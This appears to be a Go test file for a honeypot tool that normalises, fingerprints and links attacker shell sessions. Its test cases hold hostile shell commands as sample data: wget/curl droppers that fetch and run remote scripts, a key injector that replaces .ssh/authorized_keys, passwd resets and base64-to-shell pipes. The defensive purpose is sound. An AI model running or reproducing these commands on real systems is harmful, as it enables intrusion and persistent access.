package script

import (
	"reflect"
	"strings"
	"testing"
	"unicode/utf8"
)

func norm(s string) string { return strings.Join(NormalizeCommand(s), " ") }

func TestNormalizeCommandGolden(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{`uname -s -v -n -r -m`, `uname -s -v -n -r -m`},
		{`cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh`, `cd /tmp ; wget <url> ; sh x.sh`},
		{`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY mdrfckr" >> .ssh/authorized_keys`,
			`echo "ssh-rsa <key> mdrfckr" >> .ssh/authorized_keys`},
		{`echo "root\ndp75z0biqzBE\ndp75z0biqzBE" | passwd`, `echo "root\n<tok>\n<tok>" | passwd`},
		{`echo 'vT'`, `echo <tok>`},
		{`curl -s 10.0.0.9:8080/a|bash`, `curl -s <ip> | bash`},
		{`chmod 777 /tmp/kxhqwe; /tmp/kxhqwe`, `chmod <n> /tmp/<f> ; /tmp/<f>`},
		{`echo deadbeefdeadbeefdeadbeef`, `echo <hex>`},
		// From the review's executed probes:
		{`uname -a 2>&1; whoami >/dev/null 2>&1`, `uname -a 2>&1 ; whoami > /dev/null 2>&1`},
		{`base64 -d x | python3 -`, `base64 -d x | python3 -`},
		{`echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBT1fubDzcjP8Ntf33MZwaTgCpwTQRaj7IrSvXO0lBU k"`, `echo "ssh-ed25519 <key> k"`},
		{"echo a\nwhoami", `echo a ; whoami`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	if got := norm(`echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | base64 -d > x`); strings.Contains(got, "<key>") {
		t.Errorf("base64 payload mistaken for a key: %q", got)
	}
}

func TestEncodingRoundTripsQuotedTokens(t *testing.T) {
	lines := []string{EncodeLine(`echo "a ; b | c" ; uname`), EncodeLine("id")}
	got := Split(Join(lines))
	want := [][]string{NormalizeCommand(`echo "a ; b | c" ; uname`), NormalizeCommand("id")}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("round trip:\n got %q\nwant %q", got, want)
	}
	if n := CommandCount(got); n != 3 {
		t.Fatalf("CommandCount = %d, want 3 (quoted separators are not commands)", n)
	}
	if strings.ContainsAny(EncodeLine("a\x1fb\x1ec"), "\x1e") || len(Split(EncodeLine("a\x1fb\x1ec"))[0]) != 3 {
		t.Fatal("separator bytes from attacker input must be stripped")
	}
}

func TestFingerprintIgnoresPerVictimRandomness(t *testing.T) {
	a := Join([]string{EncodeLine(`echo "root\nAbc123xyz789\nAbc123xyz789" | passwd`)})
	b := Join([]string{EncodeLine(`echo "root\nQwe987rty654\nQwe987rty654" | passwd`)})
	if Fingerprint(a) != Fingerprint(b) {
		t.Fatal("random passwords changed the fingerprint")
	}
}

func TestDistinctiveRule(t *testing.T) {
	cmds := func(ss ...string) [][]string {
		var out [][]string
		for _, s := range ss {
			out = append(out, NormalizeCommand(s))
		}
		return out
	}
	if Distinctive(cmds("uname -a 2>&1", "whoami >/dev/null 2>&1", "id", "uptime", "w")) {
		t.Error("recon plus redirections must not be distinctive")
	}
	if Distinctive(cmds(`c1=$(uname -s); c2=$(grep "model name" /proc/cpuinfo | head -n1); cat /etc/issue | wc -l; crontab -l; awk '{print $1}' /proc/loadavg`)) {
		t.Error("Outlaw-style recon must not be distinctive")
	}
	if Distinctive(cmds(`cd /tmp; wget http://x/y; sh y`)) {
		t.Error("fewer than 5 commands must not be distinctive")
	}
	if !Distinctive(cmds(`cd ~; chattr -ia .ssh; lockr -ia .ssh; rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY x" >> .ssh/authorized_keys`)) {
		t.Error("the key injector must be distinctive")
	}
}

func TestLinkDecisionAndCommon(t *testing.T) {
	for _, tc := range []struct {
		distinctive        bool
		actors, population int
		links              bool
		reason             string
	}{
		{false, 2, 3000, false, "not distinctive: fewer than 5 commands or recon only"},
		{true, 2, 3000, true, "distinctive, used by 2 actors"},
		{true, 26, 100000, false, "common: used by 26 actors"},
		{true, 5, 100, false, "common: used by 5.0% of actors"},
		{true, 3, 50, true, "distinctive, used by 3 actors"}, // small honeypot: 6% but < 5 actors
	} {
		links, reason := LinkDecision(tc.distinctive, tc.actors, tc.population)
		if links != tc.links || reason != tc.reason {
			t.Errorf("LinkDecision(%v,%d,%d) = %v %q", tc.distinctive, tc.actors, tc.population, links, reason)
		}
	}
}

func FuzzNormalizeCommand(f *testing.F) {
	for _, s := range []string{`uname -a`, `echo "a\nb" | passwd`, `cd /tmp;wget http://x/y&&sh y`, "\x00\xff'\"\x1e\x1f", "2>&1 &>>x"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		line := EncodeLine(s)
		enc := Join([]string{line})
		if line != "" && !reflect.DeepEqual(Split(enc), [][]string{NormalizeCommand(s)}) {
			t.Fatalf("round trip broke for %q", s)
		}
		_ = Fingerprint(enc)
		_ = Distinctive(Split(enc))
		if d := Display(enc, 64); len(d) > 64 {
			t.Fatalf("Display exceeded its cap: %d bytes", len(d))
		}
		_ = ExtractKeys(s)
	})
}

func TestHeredocAndWrappers(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"cat <<EOF\nid\nw\nuptime\nEOF", `cat << <heredoc>`},
		{"cat <<'X' > /tmp/a\nfoo\nX\nwhoami", `cat << <heredoc> > /tmp/<f> ; whoami`},
		{`nohup python3 x`, `nohup python3 x`},
		{`sudo base64 -d f`, `sudo base64 -d f`},
		{`x=1 md5sum f`, `x=1 md5sum f`},
		// Here-strings must not trigger heredoc mode
		{`base64 -d <<< "Zm9v" | sh`, `base64 -d <<< <tok> | sh`},
		{"base64 -d <<< \"Zm9v\" | sh\ncd /tmp\nwget http://1.2.3.4/x\nchmod +x x\n./x\nrm x", `base64 -d <<< <tok> | sh ; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm x`},
		// Heredoc terminator must be exact line match, not just prefix
		{"cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid", `cat << <heredoc> ; id`},
		// An empty body: the newline after the delimiter word is itself the
		// first terminator line. Consuming it before the terminator check made
		// this heredoc swallow every later command, so any dropper prefixed
		// with `cat <<EOF\nEOF\n` collapsed to one non-distinctive command.
		{"cat <<EOF\nEOF\nid\nwget http://x/y", `cat << <heredoc> ; id ; wget <url>`},
		// A quoted delimiter line is not the terminator: bash compares the
		// raw line, so `"EOF"` must not end the body early.
		{"cat <<EOF\nbody\n\"EOF\"\nid\nEOF\nwget http://x/y", `cat << <heredoc> ; wget <url>`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	if Distinctive([][]string{NormalizeCommand("cat <<EOF\nid\nw\nuptime\nEOF")}) {
		t.Error("a heredoc body must not count as commands")
	}
	if n := CommandCount([][]string{NormalizeCommand("sudo wget http://x/y; nohup sh y; env A=1 id; busybox wget z; time ls")}); n != 5 {
		t.Errorf("CommandCount = %d, want 5", n)
	}
	if !Distinctive([][]string{NormalizeCommand("sudo wget http://x/y; nohup ./y; id; w; ls")}) {
		t.Error("wget behind sudo must count as a non-recon program")
	}
	// Here-strings must survive and be counted correctly
	// Note: CommandCount includes segments split by pipe, so base64|sh = 2, plus cd, wget, chmod, ./x, rm = 5, total = 7
	hereStringCmd := "base64 -d <<< \"Zm9v\" | sh\ncd /tmp\nwget http://1.2.3.4/x\nchmod +x x\n./x\nrm x"
	if n := CommandCount([][]string{NormalizeCommand(hereStringCmd)}); n != 7 {
		t.Errorf("here-string CommandCount = %d, want 7", n)
	}
	if !Distinctive([][]string{NormalizeCommand(hereStringCmd)}) {
		t.Error("here-string multi-command must be distinctive")
	}
	// Heredoc with trailing text after delimiter must continue
	if n := CommandCount([][]string{NormalizeCommand("cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid")}); n != 2 {
		t.Errorf("heredoc with trailing delimiter CommandCount = %d, want 2", n)
	}
}

// Wrapper options and operands are skipped so the wrapped program keeps its
// literal name: before, the program slot ended at the first option, so the
// option value or the program itself was normalised (python3 became <tok>)
// and program() reported the option ("-n") instead of the program.
func TestWrapperOptionsKeepProgram(t *testing.T) {
	for _, tc := range []struct{ in, want, prog string }{
		{`nice -n 5 python3 x`, `nice -n <n> python3 x`, "python3"},
		{`nice -19 python3 x`, `nice -19 python3 x`, "python3"},
		{`sudo -u root python3 x`, `sudo -u root python3 x`, "python3"},
		{`sudo -u abc123def python3 x`, `sudo -u <tok> python3 x`, "python3"},
		{`sudo -E -- python3 x`, `sudo -E -- python3 x`, "python3"},
		{`sudo -s python3 x`, `sudo -s python3 x`, "python3"}, // -s runs the command via the shell
		{`sudo --user=root python3 x`, `sudo --user=root python3 x`, "python3"},
		{`timeout 30 wget http://x/y`, `timeout <n> wget <url>`, "wget"},
		{`timeout -s 9 30 python3 x`, `timeout -s <n> <n> python3 x`, "python3"},
		{`timeout --kill-after=5 30s python3 x`, `timeout --kill-after=5 30s python3 x`, "python3"},
		{`env A=1 curl x`, `env A=1 curl x`, "curl"},
		{`env -i python3 x`, `env -i python3 x`, "python3"},
		{`nohup python3 x`, `nohup python3 x`, "python3"},
		{`stdbuf -oL python3 x`, `stdbuf -oL python3 x`, "python3"},
		{`stdbuf -o L python3 x`, `stdbuf -o L python3 x`, "python3"},
		{`sudo nice -n 5 python3 x`, `sudo nice -n <n> python3 x`, "python3"},
		{`nice -n 5 id`, `nice -n <n> id`, "id"},
		// Unknown options stop wrapper parsing: every later word is
		// normalised as an argument exactly as before, nothing is skipped,
		// and program() names the wrapper rather than guessing.
		{`sudo --weird python3 x`, `sudo --weird <tok> x`, "sudo"},
		{`sudo -Z python3 x`, `sudo -Z <tok> x`, "sudo"},
		{`nohup -x python3`, `nohup -x <tok>`, "nohup"},
		{`sudo -u`, `sudo -u`, ""},
		{`sudo -u; python3 x`, `sudo -u ; python3 x`, ""}, // first segment
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
	// A wrapped recon command is recon: `nice -n 5 id` used to report "-n"
	// as its program and made recon-only scripts distinctive.
	if Distinctive([][]string{NormalizeCommand("nice -n 5 id; timeout 3 uname -a; sudo -u root whoami; w; uptime")}) {
		t.Error("wrapped recon must not be distinctive")
	}
}

// An attacker who types a placeholder literally (`echo "<url>"`) must not
// produce the normaliser's own placeholder: before, that one echo made a
// recon-only script Distinctive and collided with a real URL substitution.
// Literal < and > inside words are encoded as <lt>/<gt>, which no
// substitution produces, and Display shows them shell-style as \< and \>.
func TestLiteralPlaceholdersAreEscaped(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{`echo "<url>"`, `echo "<lt>url<gt>"`},
		{`echo '<key>' > x`, `echo '<lt>key<gt>' > x`},
		{`echo "a<b http://x/y>c"`, `echo "a<lt>b <url><gt>c"`},
		{`echo "\http://x/y"`, `echo "\<url>"`},
		{`echo "\<url>"`, `echo "\<lt>url<gt>"`},
		{`echo "<lt>"`, `echo "<lt>lt<gt>"`},
		{`echo "x<Abc123xyz789>1.2.3.4"`, `echo "x<lt><tok><gt><ip>"`},
	} {
		if got := norm(tc.in); got != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
		}
	}
	cmds := func(s string) [][]string { return [][]string{NormalizeCommand(s)} }
	if Distinctive(cmds(`echo "<url>"; echo '<key>'; id; w; uptime`)) {
		t.Error("literal placeholders typed by the attacker made recon distinctive")
	}
	if !Distinctive(cmds(`echo "a<b http://x/y"; id; w; uptime; whoami`)) {
		t.Error("a real URL beside a literal < must stay distinctive")
	}
	if Fingerprint(EncodeLine(`echo "<url>"`)) == Fingerprint(EncodeLine(`echo "http://x/y"`)) {
		t.Error("a literal <url> collided with a real URL")
	}
	if Fingerprint(EncodeLine(`echo "\<url>"`)) == Fingerprint(EncodeLine(`echo "\http://x/y"`)) {
		t.Error("a backslash before a literal <url> collided with one before a real URL")
	}
	if got := Display(EncodeLine(`echo "<url>" > f`), 0); got != `echo "\<url\>" > f` {
		t.Errorf("Display = %q", got)
	}
}

// Display's cap is a byte budget for the stored column: the ellipsis counts
// toward it, no rune is split, and invalid bytes do not drag the cut back.
func TestDisplayCapIncludesEllipsis(t *testing.T) {
	for _, tc := range []struct {
		in   string
		max  int
		want string
	}{
		{strings.Repeat("a", 20), 10, "aaaaaaa…"},
		{strings.Repeat("a", 10), 10, strings.Repeat("a", 10)},
		{"aaaaaaa€€", 10, "aaaaaaa…"}, // the cut falls inside €
		{"aaaaaé€€", 10, "aaaaaé…"},   // é ends exactly at the budget
		{"a" + strings.Repeat("\x80", 20), 10, "a\x80\x80\x80\x80\x80\x80…"},
		{strings.Repeat("a", 20), 2, "aa"}, // no room for the ellipsis
		{"€€", 2, ""},                      // nor for a whole rune
		{strings.Repeat("a", 20), 3, "…"},
	} {
		got := Display(tc.in, tc.max)
		if got != tc.want || len(got) > tc.max {
			t.Errorf("Display(%q, %d) = %q (%d bytes), want %q", tc.in, tc.max, got, len(got), tc.want)
		}
	}
	// Every budget: within max, a prefix of the input, cut on a rune start.
	in := "a€b😀c\xffd" + strings.Repeat("é", 8)
	for max := 1; max <= len(in); max++ {
		got := Display(in, max)
		p := strings.TrimSuffix(got, "…")
		if len(got) > max || !strings.HasPrefix(in, p) || (len(p) < len(in) && !utf8.RuneStart(in[len(p)])) {
			t.Errorf("Display(%q, %d) = %q", in, max, got)
		}
	}
}

// A redirection operator consumes its target word: program() used to skip
// the operator and report the target (`2>/dev/null id` gave "null").
// fd duplications (2>&1) carry their target inside the token.
func TestProgramSkipsRedirectionTargets(t *testing.T) {
	for _, tc := range []struct{ in, prog string }{
		{`sudo -u root > /tmp/a wget x`, "wget"},
		{`2>/dev/null id`, "id"},
		{`> /tmp/a 2>&1 wget x`, "wget"},
		{`&> /dev/null wget x`, "wget"},
		{`< /etc/passwd sort`, "sort"},
		{`>> log nohup wget x`, "wget"},
		{`sudo > f -u root wget x`, "wget"},
		{`id > /dev/null`, "id"},
	} {
		if p := program(segments([][]string{NormalizeCommand(tc.in)})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
	if Distinctive([][]string{NormalizeCommand("2>/dev/null id; >/dev/null uname -a; w; uptime; whoami")}) {
		t.Error("recon behind leading redirections must not be distinctive")
	}
}

// Probing for tools is recon: `command -v wget` reports the wrapper (-v
// does not run its operand), and command/type/hash must not make a recon
// script Distinctive.
func TestToolProbesAreRecon(t *testing.T) {
	if Distinctive([][]string{NormalizeCommand("command -v wget; command -V curl; type python3; hash perl; id; uname -a")}) {
		t.Error("tool probes made a recon script distinctive")
	}
	if !Distinctive([][]string{NormalizeCommand("command -v wget; command -p wget x; id; w; uptime")}) {
		t.Error("a program run through `command -p` must still count")
	}
}

// A leading redirection and its target keep the program slot open, so the
// word after them keeps its literal name exactly as program() reports it.
func TestLeadingRedirectionKeepsProgram(t *testing.T) {
	for _, tc := range []struct{ in, want, prog string }{
		{`> /tmp/a python3 x`, `> /tmp/<f> python3 x`, "python3"},
		{`2>/dev/null python3 x`, `2> /dev/null python3 x`, "python3"},
		{`2>&1 python3 x`, `2>&1 python3 x`, "python3"},
		{`>/dev/null 2>&1 python3 x`, `> /dev/null 2>&1 python3 x`, "python3"},
		{`< /tmp/kxhqwe python3`, `< /tmp/<f> python3`, "python3"},
		{`> abc123def python3`, `> <tok> python3`, "python3"}, // the target is still normalised
		{`sudo -u root > /tmp/a python3 x`, `sudo -u root > /tmp/<f> python3 x`, "python3"},
		{`sudo > f -u root python3 x`, `sudo > f -u root python3 x`, "python3"},
		{"id >\npython3 x", `id > ; python3 x`, "id"},
	} {
		got := NormalizeCommand(tc.in)
		if s := strings.Join(got, " "); s != tc.want {
			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, s, tc.want)
		}
		if p := program(segments([][]string{got})[0]); p != tc.prog {
			t.Errorf("program(%q) = %q, want %q", tc.in, p, tc.prog)
		}
	}
}
